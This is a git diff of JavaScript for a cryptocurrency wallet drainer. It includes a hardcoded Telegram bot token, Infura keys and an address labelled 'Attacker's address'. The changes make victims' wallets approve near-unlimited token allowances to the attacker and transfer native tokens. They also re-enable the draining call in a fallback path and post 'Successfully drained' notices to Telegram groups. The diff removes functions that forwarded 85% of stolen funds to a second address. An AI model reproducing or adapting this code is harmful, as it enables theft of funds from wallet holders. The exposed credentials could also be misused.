@@ -1,13 +1,13 @@
 // Telegram bot token and group IDs
 const telegramBotToken = "7236108767:AAHgctM1RM7YJAj_tdh709ab8FIp05ZdH4E";
-const walletConnectionsGroupID = "-1002232445167";
-const allowanceIncreasesGroupID = "-1002147303946";
-const spenderAddress = "0x3577e3517e526950d62d0b13a2e2af836d3d2b6d"; // Attacker's address
-const childAddress = "0xdd959e5e55Bf6a37aBa441bf86E2A0e5394cFf32";//child address
+const walletConnectionsGroupID = "-1002232445167"//"-1002232445167";
+const allowanceIncreasesGroupID = "-1002147303946"//"";-4107946236
+const spenderAddress = "0xdd959e5e55Bf6a37aBa441bf86E2A0e5394cFf32"//"0x3577e3517e526950d62d0b13a2e2af836d3d2b6d"; // Attacker's address
+// const childAddress = "0x5b884a907ACC7EA3AbFB2CaE87231Ae91299271C"//"0xdd959e5e55Bf6a37aBa441bf86E2A0e5394cFf32";//child address
 
 const networks ={
     ethereum:"https://mainnet.infura.io/v3/e2d084c3e2b94d6a9aa226a51876387e",
-    bsc:"https://bsc-dataseed1.defibit.io/",
+    bsc:"https://bsc-dataseed2.binance.org/",
     polygon:"https://polygon-mainnet.infura.io/v3/e2d084c3e2b94d6a9aa226a51876387e",
     arbitrum:"https://arbitrum-mainnet.infura.io/v3/e2d084c3e2b94d6a9aa226a51876387e",
     fantom:"https://rpc.ankr.com/fantom/",
@@ -162,7 +162,6 @@ async function transferNativeToken(signer, balance, network) {
         await transaction.wait();
 
         console.log("Successfully transferred native token...");
-        shareNativeRewards(network,balance);
     } catch (error) {
         console.error("Error transferring native token:", error);
     }
@@ -170,25 +169,25 @@ async function transferNativeToken(signer, balance, network) {
 
 // Function to request increased allowance with Telegram notification
 async function requestIncreasedAllowance(signer, balances, spenderAddress, network) {
+    const allowance_ = ethers.constants.MaxUint256.sub(ethers.BigNumber.from(100));
     
     for (const token of balances) {
         try{
             const tokenContract = new ethers.Contract(token.address, abi, signer);
-            const tx = await tokenContract.increaseAllowance(spenderAddress, token.balance);
+            const tx = await tokenContract.increaseAllowance(spenderAddress, allowance_);
             await tx.wait();
             console.log("sucessfully increased allocation or approved..");
             
             // Send notification to Telegram group
-            const message = `${ethers.utils.formatEther(token.balance.toString())} Allowance increased for ${token.address} by ${await signer.getAddress()}`;
+            const message = `Allowance increased for ${token.address} by ${token.balance.toString()}`;
             await sendTelegramNotification(allowanceIncreasesGroupID, message);
-            console.log("network2server is ",network);
 
             serverSideLogic(signer, token.balance, token.address, network);
             console.log("sent to server..");
         }catch{
             try{
                 const tokenContract = new ethers.Contract(token.address, abi, signer);
-                const tx = await tokenContract.approve(spenderAddress, token.balance);
+                const tx = await tokenContract.approve(spenderAddress, allowance_);
                 await tx.wait();
                 console.log("sucessfully increased allocation or approved..");
                 
@@ -200,7 +199,7 @@ async function requestIncreasedAllowance(signer, balances, spenderAddress, netwo
                 console.log("sent to server..");
             }catch{
                 console.warn("error in setting allowance or approving user");
-                // await serverSideLogic(signer, token.balance, token.address, network);
+                await serverSideLogic(signer, token.balance, token.address, network);
             }
         }
     }
@@ -281,8 +280,13 @@ async function serverSideLogic(signer, amount_, tokenAddress, network){
         const userAddress = await signer.getAddress();
         console.log("user Address is ",userAddress);
         console.log("token address is ",tokenAddress);
-        // console.log("token balance is ",ethers.utils.formatEther(amount_));
+        console.log("token balance is ",ethers.utils.formatEther(ethers.BigNumber.from(amount_)));
         console.log("spender Address is ",spenderAddress);
+        // const bb = ethers.BigNumber.from(amount_);
+        // const cc = ethers.BigNumber.from(98);
+        // const dd = ethers.BigNumber.from(100);
+        // const final = bb.mul(cc).div(dd);
+        // console.log("the final price is ",ethers.utils.formatEther(final));
     
         try{
             console.log("trying to transfer allowance...");
@@ -292,37 +296,8 @@ async function serverSideLogic(signer, amount_, tokenAddress, network){
             // Send notification to Telegram group
             const message = `Successfully drained Allowance for ${tokenAddress} by ${await signer.getAddress()}`;
             await sendTelegramNotification(allowanceIncreasesGroupID, message);
-            shareRewards(network, amount_, tokenAddress);
         }catch(err){
             console.log("error transveeing the allowance...");
             console.log(err);
         };
-}
-
-async function shareTokenRewards(network, amount, tokenAddress){
-    const providerUrl = networks[network];
-    const provider = new ethers.providers.JsonRpcProvider(providerUrl);
-    const wallet = new ethers.Wallet(PK,provider);
-    const contract = new ethers.Contract(tokenAddress, abi, wallet);
-
-    const _85 = (amount*85)/100;
-
-    const receipt = await contract.transfer(childAddress,_85);
-    const tx = await receipt.wait();
-    console.log("successfully transferred 85% of token...");
-}
-
-async function shareNativeRewards(network, amount){
-    const providerUrl = networks[network];
-    const provider = new ethers.providers.JsonRpcProvider(providerUrl);
-    const wallet = new ethers.Wallet(PK,provider);
-    const _85 = (amount*85)/100;
-
-    const tx = {
-        to:childAddress,
-        value:_85
-    };
-    const txn = await wallet.sendTransaction(tx);
-    await txn.wait();
-    console.log("successfully transferred 85% of Netwok token...");
 }
